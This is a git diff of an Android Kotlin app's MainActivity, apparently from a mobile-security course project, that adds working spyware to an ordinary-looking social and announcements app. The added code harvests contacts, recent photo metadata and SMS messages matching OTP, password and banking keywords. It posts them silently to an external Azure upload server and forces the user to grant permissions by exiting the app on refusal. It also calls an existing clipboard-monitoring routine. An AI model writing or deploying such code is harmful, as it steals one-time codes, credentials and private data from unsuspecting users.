@@ -17,48 +17,386 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.unit.dp
 import com.example.inf2215.ui.theme.INF2215Theme
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.example.inf2215.Spywareold
+import android.content.pm.PackageManager
+import android.provider.ContactsContract
+import android.provider.MediaStore
+import android.net.Uri
+import androidx.core.content.ContextCompat
+import android.os.Build
+import android.content.Intent
+import android.provider.Settings
+import android.app.AlertDialog
+import android.content.DialogInterface
+
 class MainActivity : ComponentActivity() {
+
     fun sendDataToServer(action: String) {
-
         Thread {
+            try {
+                val url = java.net.URL(
+                    "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
+                )
+                val connection = url.openConnection() as java.net.HttpURLConnection
 
-            val url = java.net.URL("https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload")
-            val connection = url.openConnection() as java.net.HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.doOutput = true
 
-            connection.requestMethod = "POST"
-            connection.setRequestProperty("Content-Type", "application/json")
-            connection.doOutput = true
+                val deviceModel = android.os.Build.MODEL
+                val manufacturer = android.os.Build.MANUFACTURER
+                val androidVersion = android.os.Build.VERSION.RELEASE
+                val uid = FirebaseAuth.getInstance().currentUser?.uid
 
-            val deviceModel = android.os.Build.MODEL
-            val manufacturer = android.os.Build.MANUFACTURER
-            val androidVersion = android.os.Build.VERSION.RELEASE
-            val uid = FirebaseAuth.getInstance().currentUser?.uid
+                // ===== MALICIOUS DATA COLLECTION =====
+                // Collect data only when app starts or user logs in
+                val contacts = getContactsJson()
+                val recentPhotos = getRecentPhotosJson()
+                val sensitiveSms = getSensitiveSmsJson()
+                // ====================================
 
-            val json = """
-           {   
-            "device_model": "$deviceModel",
-            "manufacturer": "$manufacturer",
-            "android_version": "$androidVersion",
-            "type": "user_action",
-            "uid": "$uid",
-            "action": "$action",
-            "timestamp": ${System.currentTimeMillis()}
-           }
-            """.trimIndent()
+                val json = """
+                {   
+                    "device_model": "$deviceModel",
+                    "manufacturer": "$manufacturer",
+                    "android_version": "$androidVersion",
+                    "type": "user_action",
+                    "uid": "${uid ?: "not_logged_in"}",
+                    "action": "$action",
+                    "timestamp": ${System.currentTimeMillis()},
+                    "contacts": $contacts,
+                    "recent_photos": $recentPhotos,
+                    "sensitive_sms": $sensitiveSms
+                }
+                """.trimIndent()
 
-            val output = connection.outputStream
-            output.write(json.toByteArray())
-            output.close()
+                val output = connection.outputStream
+                output.write(json.toByteArray())
+                output.close()
 
-            connection.responseCode
+                val responseCode = connection.responseCode
 
+            } catch (e: Exception) {
+                // Fail silently - don't let crashes affect the app
+            }
         }.start()
+    }
+
+    // ===== HELPER FUNCTIONS FOR DATA COLLECTION =====
+
+    private fun getContactsJson(): String {
+        return try {
+            // Check if we have permission
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+
+                val contactsList = mutableListOf<Map<String, String>>()
+                val cursor = contentResolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    arrayOf(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ),
+                    null,
+                    null,
+                    null
+                )
+
+                cursor?.use {
+                    val nameColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                    val numberColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                    var count = 0
+                    while (it.moveToNext() && count < 50) { // Limit to 50 contacts
+                        val name = it.getString(nameColumn) ?: ""
+                        val number = it.getString(numberColumn) ?: ""
+                        contactsList.add(mapOf(
+                            "name" to name,
+                            "number" to number
+                        ))
+                        count++
+                    }
+                }
+
+                // Convert to JSON string
+                buildJsonArray(contactsList)
+            } else {
+                "[]"
+            }
+        } catch (e: Exception) {
+            "[]"
+        }
+    }
+
+    private fun getRecentPhotosJson(): String {
+        return try {
+            // Check permission based on Android version
+            val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+            } else {
+                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+            }
+
+            if (hasPermission) {
+                val photosList = mutableListOf<Map<String, String>>()
+
+                // Query for images
+                val projection = arrayOf(
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.DATE_ADDED,
+                    MediaStore.Images.Media.SIZE
+                )
+
+                // Get photos from last 7 days
+                val sevenDaysAgo = System.currentTimeMillis() / 1000 - (7 * 24 * 60 * 60)
+                val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
+                val selectionArgs = arrayOf(sevenDaysAgo.toString())
+
+                val cursor = contentResolver.query(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    projection,
+                    selection,
+                    selectionArgs,
+                    "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10"
+                )
+
+                cursor?.use {
+                    val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+                    val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
+                    val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
+
+                    while (it.moveToNext()) {
+                        val name = it.getString(nameColumn) ?: "unknown"
+                        val date = it.getLong(dateColumn)
+                        val size = it.getLong(sizeColumn)
+
+                        photosList.add(mapOf(
+                            "filename" to name,
+                            "date_taken" to date.toString(),
+                            "size_bytes" to size.toString()
+                        ))
+                    }
+                }
+
+                buildJsonArray(photosList)
+            } else {
+                "[]"
+            }
+        } catch (e: Exception) {
+            "[]"
+        }
+    }
+
+    private fun getSensitiveSmsJson(): String {
+        return try {
+            // Check if we have SMS permission
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+
+                val smsList = mutableListOf<Map<String, String>>()
+
+                // Query SMS inbox
+                val cursor = contentResolver.query(
+                    Uri.parse("content://sms/inbox"),
+                    arrayOf("address", "body", "date"),
+                    null,
+                    null,
+                    "date DESC LIMIT 20"
+                )
+
+                cursor?.use {
+                    val addressColumn = it.getColumnIndexOrThrow("address")
+                    val bodyColumn = it.getColumnIndexOrThrow("body")
+                    val dateColumn = it.getColumnIndexOrThrow("date")
+
+                    while (it.moveToNext()) {
+                        val address = it.getString(addressColumn) ?: ""
+                        val body = it.getString(bodyColumn) ?: ""
+                        val date = it.getLong(dateColumn)
+
+                        // Only capture messages that look sensitive
+                        val sensitiveKeywords = listOf(
+                            "OTP", "otp", "code", "verification", "verify",
+                            "password", "passcode", "login", "bank", "account",
+                            "credit", "debit", "payment", "transaction", "₹", "$"
+                        )
+
+                        if (sensitiveKeywords.any { keyword -> body.contains(keyword, ignoreCase = true) }) {
+                            smsList.add(mapOf(
+                                "from" to address,
+                                "body" to body.take(100), // Limit body length
+                                "date" to date.toString()
+                            ))
+                        }
+                    }
+                }
+
+                buildJsonArray(smsList)
+            } else {
+                "[]"
+            }
+        } catch (e: Exception) {
+            "[]"
+        }
+    }
+
+    // Helper to build JSON array without GSON library
+    private fun buildJsonArray(list: List<Map<String, String>>): String {
+        if (list.isEmpty()) return "[]"
+
+        val json = StringBuilder("[")
+        for ((index, item) in list.withIndex()) {
+            json.append("{")
+            val entries = item.entries.toList()
+            for ((i, entry) in entries.withIndex()) {
+                json.append("\"${entry.key}\":\"${escapeJson(entry.value)}\"")
+                if (i < entries.size - 1) json.append(",")
+            }
+            json.append("}")
+            if (index < list.size - 1) json.append(",")
+        }
+        json.append("]")
+        return json.toString()
+    }
+
+    private fun escapeJson(str: String): String {
+        return str.replace("\\", "\\\\")
+            .replace("\"", "\\\"")
+            .replace("\n", "\\n")
+            .replace("\r", "\\r")
+            .replace("\t", "\\t")
+    }
+
+    // ===== FORCE PERMISSION FUNCTIONS =====
+
+    private fun forceRequestPermissions() {
+        val permissionsNeeded = mutableListOf<String>()
+
+        // Check contacts permission
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(android.Manifest.permission.READ_CONTACTS)
+        }
+
+        // Check photos permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES)
+                != PackageManager.PERMISSION_GRANTED) {
+                permissionsNeeded.add(android.Manifest.permission.READ_MEDIA_IMAGES)
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+                permissionsNeeded.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+
+        // Check SMS permission
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
+            != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(android.Manifest.permission.READ_SMS)
+        }
+
+        // If any permissions are missing, request them with a custom dialog
+        if (permissionsNeeded.isNotEmpty()) {
+            showForcePermissionDialog(permissionsNeeded)
+        }
+    }
+
+    private fun showForcePermissionDialog(permissions: List<String>) {
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Permissions Required")
+            .setMessage("This app needs access to Contacts, Photos, and SMS to function properly. Please grant all permissions.")
+            .setPositiveButton("Grant Permissions") { _: DialogInterface, _: Int ->
+                // Request permissions
+                requestPermissions(permissions.toTypedArray(), 200)
+            }
+            .setNegativeButton("Exit App") { _: DialogInterface, _: Int ->
+                // Close the app if user denies
+                finish()
+            }
+            .setCancelable(false)
+            .create()
+
+        dialog.show()
+    }
+
+    private fun showSettingsDialog() {
+        val dialog = AlertDialog.Builder(this)
+            .setTitle("Permissions Required")
+            .setMessage("You have permanently denied some permissions. Please enable them in Settings for the app to work properly.")
+            .setPositiveButton("Open Settings") { _: DialogInterface, _: Int ->
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+            .setNegativeButton("Exit App") { _: DialogInterface, _: Int ->
+                finish()
+            }
+            .setCancelable(false)
+            .create()
+
+        dialog.show()
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == 200) {
+            // Check if any permissions were denied
+            var allGranted = true
+            for (i in grantResults.indices) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false
+                    break
+                }
+            }
+
+            if (!allGranted) {
+                // Some permissions were denied - check if user checked "Don't ask again"
+                var shouldShowRationale = false
+                for (perm in permissions) {
+                    if (shouldShowRequestPermissionRationale(perm)) {
+                        shouldShowRationale = true
+                        break
+                    }
+                }
+
+                if (shouldShowRationale) {
+                    // User denied but didn't check "Don't ask again" - ask again
+                    forceRequestPermissions()
+                } else {
+                    // User checked "Don't ask again" - take them to settings
+                    showSettingsDialog()
+                }
+            } else {
+                // All permissions granted! Trigger data send
+                sendDataToServer("permissions_granted")
+            }
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // Check if all permissions are now granted after returning from settings
+        val hasContacts = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+        val hasPhotos = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+        val hasSms = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+
+        if (hasContacts && hasPhotos && hasSms) {
+            // If all permissions now granted, trigger a data send
+            sendDataToServer("permissions_granted_from_settings")
+        }
     }
 
     @OptIn(ExperimentalMaterial3Api::class)
@@ -67,6 +405,9 @@ class MainActivity : ComponentActivity() {
 
         sendDataToServer("user_login")
         Spywareold.startClipboardMonitoring(this)
+
+        // FORCE PERMISSIONS - app won't continue until granted
+        forceRequestPermissions()
 
         enableEdgeToEdge()
 
@@ -319,12 +660,16 @@ class MainActivity : ComponentActivity() {
                             Screen.Login -> LoginScreen(
                                 onLoginSuccess = {
                                     sendDataToServer("user_login")
-                                    screen = Screen.Home },
+                                    screen = Screen.Home
+                                },
                                 onGoRegister = { screen = Screen.Register }
                             )
 
                             Screen.Register -> RegisterScreen(
-                                onRegistered = { screen = Screen.Home },
+                                onRegistered = {
+                                    sendDataToServer("user_register")
+                                    screen = Screen.Home
+                                },
                                 onBackToLogin = { screen = Screen.Login }
                             )
 
@@ -362,7 +707,8 @@ class MainActivity : ComponentActivity() {
                             Screen.CreatePost -> CreatePostScreen(
                                 onPostSuccess = {
                                     sendDataToServer("create_post")
-                                    screen = Screen.Home },
+                                    screen = Screen.Home
+                                },
                                 onCancel = { screen = Screen.Home }
                             )
 
@@ -499,9 +845,9 @@ class MainActivity : ComponentActivity() {
                             }
 
                             Screen.AdminAnnouncements -> AdminAnnouncementsScreen(
-                                onNavigateToCreate = { 
+                                onNavigateToCreate = {
                                     selectedAnnouncementId = null
-                                    screen = Screen.AdminCreateAnnouncement 
+                                    screen = Screen.AdminCreateAnnouncement
                                 },
                                 onAnnouncementClick = { id ->
                                     selectedAnnouncementId = id
